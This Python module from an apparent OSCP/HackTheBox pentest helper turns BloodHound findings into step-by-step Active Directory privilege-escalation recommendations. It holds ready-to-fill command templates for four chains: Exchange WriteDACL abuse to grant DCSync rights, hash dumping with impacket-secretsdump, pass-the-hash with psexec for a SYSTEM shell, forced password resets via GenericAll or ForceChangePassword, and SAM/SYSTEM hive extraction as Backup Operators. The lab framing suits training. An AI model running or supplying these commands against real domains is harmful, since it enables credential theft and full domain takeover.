"""
Attack Chain Detection and Dynamic Recommendation Generation.

This module detects multi-step privilege escalation paths from BloodHound
data and generates step-by-step recommendations with context.

Attack chains are detected by analyzing combinations of findings that
together form a viable escalation path. For example:

Forest HTB Chain:
    Account Operators membership + Exchange WriteDACL on Domain
    → Create user → Add to Exchange Windows Permissions → Grant DCSync → Dump hashes

Each chain defines:
    - Required findings (prerequisites)
    - Steps with dynamic command generation
    - Context explaining WHY each step works
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import List, Dict, Optional, Any, Callable
import uuid

from .models import (
    Finding,
    FindingType,
    Recommendation,
    RecommendationPriority,
    AttackState,
)


class ChainStatus(Enum):
    """Status of an attack chain."""
    NOT_VIABLE = auto()     # Missing prerequisites
    READY = auto()          # All prerequisites met, can start
    IN_PROGRESS = auto()    # Currently executing
    COMPLETED = auto()      # All steps done
    BLOCKED = auto()        # Step failed, cannot continue


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    id: str
    name: str
    description: str
    why: str                           # Explanation of WHY this works
    command_template: str              # Command with {placeholders}
    required_vars: List[str]           # Variables needed for command
    platform: str = "kali"             # "kali" or "target"
    on_success_note: Optional[str] = None
    on_failure_note: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackChain:
    """
    A multi-step privilege escalation path.

    Chains are detected from BloodHound findings and generate
    context-aware recommendations for each step.
    """
    id: str
    name: str
    description: str
    oscp_relevance: str               # Why this matters for OSCP
    required_finding_tags: List[str]  # All these tags must be present
    steps: List[ChainStep]
    priority: RecommendationPriority = RecommendationPriority.CRITICAL
    metadata: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# KNOWN ATTACK CHAINS
# ============================================================================

EXCHANGE_DCSYNC_CHAIN = AttackChain(
    id="exchange_dcsync",
    name="Exchange WriteDACL → DCSync",
    description=(
        "Exploit Exchange Windows Permissions WriteDACL on domain to grant "
        "DCSync rights and dump all domain hashes."
    ),
    oscp_relevance=(
        "Common in environments with Exchange Server installed. "
        "The Exchange Windows Permissions group has excessive rights by default."
    ),
    required_finding_tags=["ACCOUNT_OPERATORS", "EXCHANGE_WINDOWS_PERMISSIONS", "WRITEDACL"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="create_user",
            name="Create Domain User",
            description="Create a new domain user via Account Operators privilege",
            why=(
                "Account Operators can create users and add them to non-protected groups. "
                "We need a clean user to grant DCSync rights without modifying the current session."
            ),
            command_template="net user {new_user} '{new_pass}' /add /domain",
            required_vars=["new_user", "new_pass"],
            platform="target",
            on_success_note="User created. Next: add to Exchange Windows Permissions.",
            on_failure_note="Account Operators privilege may not be effective. Check group membership.",
        ),
        ChainStep(
            id="add_to_exchange",
            name="Add User to Exchange Windows Permissions",
            description="Add new user to Exchange Windows Permissions group",
            why=(
                "Exchange Windows Permissions has WriteDACL on the domain object. "
                "Adding our user gives us the ability to modify domain-level ACLs."
            ),
            command_template='net group "Exchange Windows Permissions" {new_user} /add',
            required_vars=["new_user"],
            platform="target",
            on_success_note="User is now in Exchange Windows Permissions. Next: grant DCSync rights.",
        ),
        ChainStep(
            id="add_winrm_access",
            name="Add to Remote Management Users (optional)",
            description="Add user to Remote Management Users for WinRM access",
            why=(
                "This step is optional but allows testing with a fresh session. "
                "The new user will have WinRM access if this succeeds."
            ),
            command_template='net localgroup "Remote Management Users" {new_user} /add',
            required_vars=["new_user"],
            platform="target",
        ),
        ChainStep(
            id="grant_dcsync",
            name="Grant DCSync Rights via PowerView",
            description="Use PowerView Add-ObjectACL to grant replication rights",
            why=(
                "WriteDACL allows modifying the domain's Discretionary Access Control List. "
                "We add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights, "
                "which are required for DCSync (domain replication protocol abuse)."
            ),
            command_template=""". .\\PowerView.ps1
$pass = ConvertTo-SecureString '{new_pass}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{new_user}', $pass)
Add-ObjectACL -PrincipalIdentity {new_user} -Credential $cred -Rights DCSync""",
            required_vars=["new_user", "new_pass", "domain"],
            platform="target",
            on_success_note="DCSync rights granted. Run secretsdump from Kali.",
            on_failure_note="PowerView may have been blocked. Try manual ACL modification.",
            metadata={"requires_upload": "PowerView.ps1"},
        ),
        ChainStep(
            id="dcsync_dump",
            name="DCSync - Extract Domain Hashes",
            description="Use secretsdump to extract all domain user hashes",
            why=(
                "DCSync mimics a Domain Controller requesting replication data. "
                "With DCSync rights, we can extract password hashes for all users "
                "including the Administrator, without needing NTDS.dit access."
            ),
            command_template="impacket-secretsdump {domain}/{new_user}:'{new_pass}'@{target}",
            required_vars=["domain", "new_user", "new_pass", "target"],
            platform="kali",
            on_success_note="Look for Administrator NTLM hash for pass-the-hash.",
        ),
        ChainStep(
            id="pass_the_hash",
            name="Pass-the-Hash to SYSTEM",
            description="Use Administrator NTLM hash for SYSTEM shell",
            why=(
                "With the Administrator NTLM hash, we can authenticate without "
                "knowing the password. psexec creates a service on the target "
                "and returns a SYSTEM shell."
            ),
            command_template="impacket-psexec {domain}/Administrator@{target} -hashes {admin_hash}",
            required_vars=["domain", "target", "admin_hash"],
            platform="kali",
            on_success_note="SYSTEM shell achieved. Get root.txt flag.",
        ),
    ],
)


GENERICALL_PASSWORD_RESET_CHAIN = AttackChain(
    id="genericall_password_reset",
    name="GenericAll → Password Reset → Lateral Movement",
    description=(
        "Use GenericAll rights on a user to reset their password and "
        "gain access to their resources."
    ),
    oscp_relevance=(
        "GenericAll is full control. If you have this on a user, "
        "you can reset their password without knowing the current one."
    ),
    required_finding_tags=["GENERICALL", "HIGH_VALUE"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="reset_password",
            name="Reset Target User Password",
            description="Reset password using GenericAll privilege",
            why=(
                "GenericAll includes the right to reset passwords. "
                "The target won't be notified and their current password is irrelevant."
            ),
            command_template="net user {target_user} '{new_pass}' /domain",
            required_vars=["target_user", "new_pass"],
            platform="target",
            on_success_note="Password reset. Test credentials via crackmapexec.",
            on_failure_note="May require PowerView Set-DomainUserPassword instead.",
        ),
        ChainStep(
            id="test_creds",
            name="Verify Credentials",
            description="Test the new credentials work",
            why="Always verify credential changes before proceeding.",
            command_template="crackmapexec smb {target} -u '{target_user}' -p '{new_pass}' -d {domain}",
            required_vars=["target", "target_user", "new_pass", "domain"],
            platform="kali",
        ),
    ],
)


FORCECHANGEPASSWORD_CHAIN = AttackChain(
    id="force_change_password",
    name="ForceChangePassword → Credential Access",
    description="Reset a user's password using ForceChangePassword right.",
    oscp_relevance=(
        "ForceChangePassword is more limited than GenericAll but "
        "still allows password resets on the target user."
    ),
    required_finding_tags=["FORCECHANGEPASSWORD"],
    priority=RecommendationPriority.HIGH,
    steps=[
        ChainStep(
            id="change_password",
            name="Force Password Change",
            description="Reset password using ForceChangePassword privilege",
            why=(
                "ForceChangePassword right allows changing another user's password "
                "without knowing their current password."
            ),
            command_template=""". .\\PowerView.ps1
$NewPassword = ConvertTo-SecureString '{new_pass}' -AsPlainText -Force
Set-DomainUserPassword -Identity {target_user} -AccountPassword $NewPassword""",
            required_vars=["target_user", "new_pass"],
            platform="target",
            on_success_note="Password changed. Test with crackmapexec.",
            metadata={"requires_upload": "PowerView.ps1"},
        ),
    ],
)


BACKUP_OPERATORS_CHAIN = AttackChain(
    id="backup_operators",
    name="Backup Operators → NTDS.dit Extraction",
    description=(
        "Use Backup Operators privilege to backup NTDS.dit and SYSTEM hive, "
        "then extract hashes offline."
    ),
    oscp_relevance=(
        "Backup Operators can backup any file including NTDS.dit. "
        "This is a well-known privilege escalation path."
    ),
    required_finding_tags=["BACKUP_OPERATORS"],
    priority=RecommendationPriority.CRITICAL,
    steps=[
        ChainStep(
            id="backup_sam",
            name="Backup SAM and SYSTEM Hives",
            description="Use reg.exe to save SAM and SYSTEM registry hives",
            why=(
                "Backup Operators can read protected files. "
                "SAM contains local user hashes, SYSTEM contains the boot key for decryption."
            ),
            command_template="""reg save HKLM\\SAM C:\\Temp\\sam.save
reg save HKLM\\SYSTEM C:\\Temp\\system.save""",
            required_vars=[],
            platform="target",
            on_success_note="Registry hives saved. Transfer to Kali for extraction.",
        ),
        ChainStep(
            id="extract_hashes",
            name="Extract Hashes with secretsdump",
            description="Use secretsdump to extract hashes from saved hives",
            why="secretsdump can parse registry hives offline to extract password hashes.",
            command_template="impacket-secretsdump -sam sam.save -system system.save LOCAL",
            required_vars=[],
            platform="kali",
            on_success_note="Local Administrator hash extracted. Use for pass-the-hash.",
        ),
    ],
)


# Registry of all known attack chains
ATTACK_CHAINS: List[AttackChain] = [
    EXCHANGE_DCSYNC_CHAIN,
    GENERICALL_PASSWORD_RESET_CHAIN,
    FORCECHANGEPASSWORD_CHAIN,
    BACKUP_OPERATORS_CHAIN,
]


# ============================================================================
# CHAIN DETECTION
# ============================================================================

class ChainDetector:
    """
    Detect viable attack chains from BloodHound findings.

    Analyzes findings to determine which attack chains are possible
    and generates context-aware recommendations for execution.
    """

    def __init__(
        self,
        state: AttackState,
        chains: Optional[List[AttackChain]] = None,
    ):
        """
        Initialize chain detector.

        Args:
            state: Current attack state with findings
            chains: Known attack chains (defaults to ATTACK_CHAINS)
        """
        self.state = state
        self.chains = chains or ATTACK_CHAINS
        self._detected_chains: Dict[str, ChainStatus] = {}
        self._chain_progress: Dict[str, int] = {}  # chain_id -> step index

    def detect_viable_chains(self) -> List[AttackChain]:
        """
        Detect all attack chains that are currently viable.

        A chain is viable if all its required_finding_tags are present
        in the current state's findings.

        Returns:
            List of viable attack chains, sorted by priority
        """
        viable = []

        # Collect all tags from findings
        all_tags = set()
        for finding in self.state.findings.values():
            all_tags.update(finding.tags)

        # Check each chain
        for chain in self.chains:
            required_tags = set(chain.required_finding_tags)
            if required_tags.issubset(all_tags):
                self._detected_chains[chain.id] = ChainStatus.READY
                viable.append(chain)
            else:
                missing = required_tags - all_tags
                self._detected_chains[chain.id] = ChainStatus.NOT_VIABLE

        # Sort by priority (CRITICAL first)
        viable.sort(key=lambda c: c.priority.value)

        return viable

    def get_chain_requirements(self, chain: AttackChain) -> Dict[str, Any]:
        """
        Get what's needed vs what we have for a chain.

        Returns:
            Dict with 'required', 'present', 'missing' tag lists
        """
        all_tags = set()
        for finding in self.state.findings.values():
            all_tags.update(finding.tags)

        required = set(chain.required_finding_tags)
        present = required.intersection(all_tags)
        missing = required - all_tags

        return {
            "required": list(required),
            "present": list(present),
            "missing": list(missing),
            "viable": len(missing) == 0,
        }

    def generate_chain_recommendations(
        self,
        chain: AttackChain,
        context: Dict[str, str],
    ) -> List[Recommendation]:
        """
        Generate recommendations for all steps in a chain.

        Args:
            chain: The attack chain to generate recommendations for
            context: Variables to fill in command templates
                    (e.g., {"target": "10.10.10.161", "domain": "htb.local"})

        Returns:
            List of Recommendation objects for each step
        """
        recommendations = []

        for i, step in enumerate(chain.steps):
            rec = self._step_to_recommendation(chain, step, i, context)
            if rec:
                recommendations.append(rec)

        return recommendations

    def _step_to_recommendation(
        self,
        chain: AttackChain,
        step: ChainStep,
        step_index: int,
        context: Dict[str, str],
    ) -> Optional[Recommendation]:
        """Convert a chain step to a recommendation."""

        # Check if we have all required variables
        missing_vars = []
        for var in step.required_vars:
            if var not in context:
                missing_vars.append(var)

        # Fill in command template
        try:
            command = step.command_template.format(**context)
        except KeyError as e:
            # Missing variable - note it in the recommendation
            command = step.command_template
            for var in step.required_vars:
                if var not in context:
                    command = command.replace(f"{{{var}}}", f"<{var.upper()}>")

        # Build description with chain context
        description = f"[{chain.name} - Step {step_index + 1}/{len(chain.steps)}] {step.name}"

        # Build WHY with context
        why = step.why
        if step.on_success_note:
            why += f"\n\nOn success: {step.on_success_note}"

        # Determine action type
        action_type = "manual_step" if step.platform == "target" else "run_command"

        # Create recommendation
        rec = Recommendation(
            id=f"chain_{chain.id}_step_{step.id}_{uuid.uuid4().hex[:8]}",
            priority=chain.priority,
            trigger_finding_id=f"chain_{chain.id}",
            action_type=action_type,
            description=description,
            why=why,
            command=command,
            metadata={
                "chain_id": chain.id,
                "chain_name": chain.name,
                "step_id": step.id,
                "step_index": step_index,
                "total_steps": len(chain.steps),
                "platform": step.platform,
                "missing_vars": missing_vars,
                "requires_upload": step.metadata.get("requires_upload"),
            },
        )

        # Set up chaining
        if step_index < len(chain.steps) - 1:
            next_step = chain.steps[step_index + 1]
            rec.on_success = [f"chain_{chain.id}_step_{next_step.id}"]

        return rec


def detect_and_recommend(
    state: AttackState,
    context: Dict[str, str],
) -> List[Recommendation]:
    """
    Main entry point: detect viable chains and generate recommendations.

    Args:
        state: Current attack state with findings
        context: Variables for command generation

    Returns:
        List of recommendations for all viable attack chains
    """
    detector = ChainDetector(state)
    viable_chains = detector.detect_viable_chains()

    all_recommendations = []
    for chain in viable_chains:
        chain_recs = detector.generate_chain_recommendations(chain, context)
        all_recommendations.extend(chain_recs)

    return all_recommendations


def get_chain_summary(state: AttackState) -> str:
    """
    Generate a summary of detected attack chains.

    Args:
        state: Current attack state

    Returns:
        Formatted string describing viable chains
    """
    detector = ChainDetector(state)
    viable = detector.detect_viable_chains()

    if not viable:
        return "No attack chains detected from current findings."

    lines = [f"Detected {len(viable)} viable attack chain(s):\n"]

    for chain in viable:
        lines.append(f"[{chain.priority.name}] {chain.name}")
        lines.append(f"    {chain.description}")
        lines.append(f"    Steps: {len(chain.steps)}")
        lines.append(f"    OSCP: {chain.oscp_relevance}")
        lines.append("")

    return "\n".join(lines)
